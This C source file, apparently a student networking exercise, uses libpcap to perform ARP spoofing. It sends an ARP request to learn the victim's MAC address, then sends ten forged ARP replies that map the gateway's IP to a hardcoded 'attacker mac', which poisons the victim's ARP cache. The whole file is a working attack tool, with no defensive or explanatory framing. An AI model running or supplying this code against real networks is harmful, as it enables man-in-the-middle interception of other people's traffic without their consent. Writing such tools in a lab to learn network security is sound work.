#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>

void usage() {
  printf("syntax: pcap_test <interface>  <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {

    if (argc != 4) {
    usage();
    return -1;
  }
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  int sip[4];

  char *ptr1 = strtok(argv[2], ".");

  int i=0;
  while(ptr1 != NULL) {
      sip[i] = atoi(ptr1);
      ptr1 = strtok(nullptr, ".");
      printf("%d ", sip[i]);
      i++;
  }
  printf("\n");

  int tip[4];
  char *ptr2 = strtok(argv[3], ".");
  i=0;
  while(ptr2 != NULL) {
      tip[i] = atoi(ptr2);
      ptr2 = strtok(nullptr, ".");
      printf("%d ", tip[i]);
      i++;
  }
  printf("\n");

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

  u_char arpr_packet[42];


  for(int i=0; i<6; i++){
      arpr_packet[i] = 0xff;
  }
  // attacker mac
  arpr_packet[6] = 0x00;
  arpr_packet[7] = 0x0c;
  arpr_packet[8] = 0x29;
  arpr_packet[9] = 0x31;
  arpr_packet[10] = 0x2f;
  arpr_packet[11] = 0xf8;
  // options
  arpr_packet[12] = 0x08;
  arpr_packet[13] = 0x06;
  arpr_packet[14] = 0x00;
  arpr_packet[15] = 0x01;
  arpr_packet[16] = 0x08;
  arpr_packet[17] = 0x00;
  arpr_packet[18] = 0x06;
  arpr_packet[19] = 0x04;
  // request
  arpr_packet[20] = 0x00;
  arpr_packet[21] = 0x01;
  // attacket mac
  arpr_packet[22] = 0x00;
  arpr_packet[23] = 0x0c;
  arpr_packet[24] = 0x29;
  arpr_packet[25] = 0x31;
  arpr_packet[26] = 0x2f;
  arpr_packet[27] = 0xf8;
  // attacker ip
  arpr_packet[28] = 192;
  arpr_packet[29] = 168;
  arpr_packet[30] = 188;
  arpr_packet[31] = 143;
  //
  for(int i=0; i<6; i++){
      arpr_packet[32+i]=0;
  }
  // sender ip
  for(int i=0; i<4; i++){
      arpr_packet[38+i] = sip[i];
  }

  pcap_sendpacket(handle, arpr_packet, 42);
  u_char arprep_packet[42];
  struct pcap_pkthdr* header;
  const u_char* packet;

  while (true) {
      //struct pcap_pkthdr* header;
      //const u_char* packet;
      int res = pcap_next_ex(handle, &header, &packet);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;

      if(packet[12]==0x08 && packet[13]==0x06 && packet[20]==0x00 && packet[21]==0x02){
          for(int i=0; i<6 ; i++){
              arprep_packet[i] = packet[i];
              arprep_packet[32+i] = packet[i];
              printf("%02x ", arprep_packet[32+i]);
          }
          printf("\n");
          break;
      }
  }

 // S-Mac
  arprep_packet[6] = 0x00;
  arprep_packet[7] = 0x0c;
  arprep_packet[8] = 0x29;
  arprep_packet[9] = 0x31;
  arprep_packet[10] = 0x2f;
  arprep_packet[11] = 0xf8;
  // Type : ARP
  arprep_packet[12] = 0x08;
  arprep_packet[13] = 0x06;
  // options
  arprep_packet[14] = 0x00;
  arprep_packet[15] = 0x01;
  arprep_packet[16] = 0x08;
  arprep_packet[17] = 0x00;
  arprep_packet[18] = 0x06;
  arprep_packet[19] = 0x04;
  // Reply
  arprep_packet[20] = 0x00;
  arprep_packet[21] = 0x02;
  // mac
  arprep_packet[22] = 0x00;
  arprep_packet[23] = 0x0c;
  arprep_packet[24] = 0x29;
  arprep_packet[25] = 0x31;
  arprep_packet[26] = 0x2f;
  arprep_packet[27] = 0xf8;
  // target-ip <= gateway !!!!
  for(int i=0; i<4; i++){
      arprep_packet[28+i] = tip[i];
  }

  // target - ip
  for(int i=0; i<4; i++){
      arprep_packet[38+i] = sip[i];
  }

  for(int i=0; i<10; i++){
      pcap_sendpacket(handle, arprep_packet, 42);
  }

  pcap_close(handle);

  return 0;
}
